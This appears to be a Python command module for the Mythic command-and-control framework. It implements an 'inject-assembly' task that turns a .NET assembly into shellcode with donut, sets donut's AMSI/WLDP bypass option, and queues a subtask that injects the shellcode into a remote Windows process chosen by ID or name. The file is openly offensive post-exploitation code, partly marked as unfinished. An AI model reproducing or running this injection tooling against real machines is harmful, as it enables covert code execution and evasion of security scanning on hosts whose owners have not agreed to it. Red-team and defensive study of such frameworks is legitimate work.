from mythic_payloadtype_container.MythicCommandBase import *  # import the basics
import json  # import any other code you might need
# import the code for interacting with Files on the Mythic server
from mythic_payloadtype_container.MythicRPC import *
import donut
import tempfile
import base64

# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class InjectAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="",
                parameter_group_info=[ParameterGroupInfo(ui_position=1)],
            ),
            CommandParameter(
                name="processID",
                type=ParameterType.String,
                description="",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            ),
            CommandParameter(
                name="processName",
                type=ParameterType.String,
                description="",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.Boolean,
                description="Arguments that are passed to the assembly",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            ),
            CommandParameter(
                name="output",
                type=ParameterType.Boolean,
                description="Get assembly output",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            )
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class InjectAssemblyCommand(CommandBase):
    cmd = "inject-assembly"
    needs_admin = False
    help_cmd = "inject-assembly"
    description = "Use donut to convert a .NET assembly into shellcode and execute the buffer in a remote process"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = ""
    argument_class = InjectAssemblyArguments
    attackmapping = []
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        #Get original file info
        file_resp = await MythicRPC().execute("get_file",
                                        file_id=task.args.get_arg("file"),
                                        task_id=task.id,
                                        get_contents=True)

        if file_resp.status == MythicRPCStatus.Success:
            if len(file_resp.response) > 0:
                file_contents = file_resp.response[0]["contents"]
                original_file_name = file_resp.response[0]["filename"]

                #Create a temporary file
                temp = tempfile.NamedTemporaryFile()

                #write file to disk
                temp.write(base64.b64decode(file_contents))

                #run donut on file
                shellcode = donut.create(
                    file=temp.name,
                    arch=3,
                    bypass=3,
                    params = '',
                )

                print(len(shellcode))

                #Register File in Mythic
                response = await MythicRPC().execute("create_file",
                    file=base64.b64encode(shellcode).decode(),
                    saved_file_name=original_file_name,
                    delete_after_fetch=True,
                )
                
                #Call shellcode-inject subtask (not finished yet)
                resp = await MythicRPC().execute("create_subtask_group", tasks=[
                    {"command": "inject-shellcode", "params": {"file":response.response["agent_file_id"], "processID":task.args.get_arg('processID').lower(), "processName":task.args.get_arg('processName'), "output":task.args.get_arg('output')}},
                    ], 
                    subtask_group_name = "ds", group_callback_function=self.load_completed.__name__, parent_task_id=task.id) #TODO

            else:
                raise Exception("Failed to find that file")
        else:
            raise Exception("Error from Mythic trying to get file: " + str(file_resp.error))

        return task

    async def process_response(self, response: AgentResponse):
        pass

